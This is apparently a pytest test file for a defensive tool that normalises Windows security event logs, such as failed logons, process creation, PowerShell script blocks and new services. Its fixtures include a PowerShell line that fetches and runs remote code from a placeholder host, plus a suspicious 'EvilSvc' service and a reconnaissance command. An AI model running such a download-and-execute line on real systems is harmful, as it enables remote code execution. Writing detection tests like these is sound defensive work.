import json
import uuid

from app.collector.normalize import normalize_event, normalize_events


def _raw(event_id, properties, message="some message", provider="Microsoft-Windows-Security-Auditing", log_name="Security", record_id=42):
    return {
        "RecordId": record_id,
        "TimeCreated": "2026-10-21T05:00:00Z",
        "Id": event_id,
        "LogName": log_name,
        "ProviderName": provider,
        "MachineName": "RAW-HOST",
        "Message": message,
        "Properties": properties,
    }


def test_normalize_failed_logon_4625():
    properties = [None] * 21
    properties[5] = "attacker"
    properties[10] = "3"
    properties[18] = "svchost.exe"
    properties[19] = "10.0.0.5"
    raw = _raw(4625, properties)

    event = normalize_event(raw, host="TESTHOST")

    assert uuid.UUID(event["id"])
    assert event["record_id"] == 42
    assert event["source"] == "agent"
    assert event["host"] == "TESTHOST"
    assert event["channel"] == "Security"
    assert event["event_id"] == 4625
    assert event["user"] == "attacker"
    assert event["logon_type"] == "3"
    assert event["process"] == "svchost.exe"
    assert event["src_ip"] == "10.0.0.5"
    assert event["command_line"] is None
    assert event["parent_process"] is None
    assert json.loads(event["raw"]) == raw


def test_normalize_process_creation_4688():
    properties = [None] * 15
    properties[1] = "jdoe"
    properties[5] = "C:\\Windows\\System32\\cmd.exe"
    properties[8] = "cmd.exe /c whoami"
    properties[13] = "explorer.exe"
    raw = _raw(4688, properties)

    event = normalize_event(raw, host="TESTHOST")

    assert event["user"] == "jdoe"
    assert event["process"] == "C:\\Windows\\System32\\cmd.exe"
    assert event["command_line"] == "cmd.exe /c whoami"
    assert event["parent_process"] == "explorer.exe"
    assert event["src_ip"] is None
    assert event["logon_type"] is None


def test_normalize_powershell_script_block_4104():
    properties = [1, 1, "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://x')", "abc-123", "C:\\script.ps1"]
    raw = _raw(4104, properties, provider="Microsoft-Windows-PowerShell", log_name="Microsoft-Windows-PowerShell/Operational")

    event = normalize_event(raw, host="TESTHOST")

    assert event["process"] == "powershell.exe"
    assert "Invoke-Expression" in event["command_line"]
    assert event["channel"] == "Microsoft-Windows-PowerShell/Operational"


def test_normalize_new_service_7045():
    properties = [None] * 5
    properties[0] = "EvilSvc"
    properties[1] = "C:\\temp\\evil.exe -k"
    properties[4] = "LocalSystem"
    raw = _raw(7045, properties, provider="Service Control Manager", log_name="System")

    event = normalize_event(raw, host="TESTHOST")

    assert event["process"] == "EvilSvc"
    assert event["command_line"] == "C:\\temp\\evil.exe -k"
    assert event["user"] == "LocalSystem"


def test_normalize_missing_properties_do_not_crash():
    raw = _raw(1102, [])
    event = normalize_event(raw, host="TESTHOST")
    assert event["user"] is None
    assert event["message"] == "some message"


def test_normalize_missing_record_id_is_none():
    raw = _raw(1102, [], record_id=None)
    event = normalize_event(raw, host="TESTHOST")
    assert event["record_id"] is None


def test_normalize_events_handles_list():
    raw_a = _raw(4625, [None] * 21)
    raw_b = _raw(4688, [None] * 15)
    events = normalize_events([raw_a, raw_b], host="TESTHOST")
    assert len(events) == 2
    assert {e["id"] for e in events} == {events[0]["id"], events[1]["id"]}
    assert len({e["id"] for e in events}) == 2
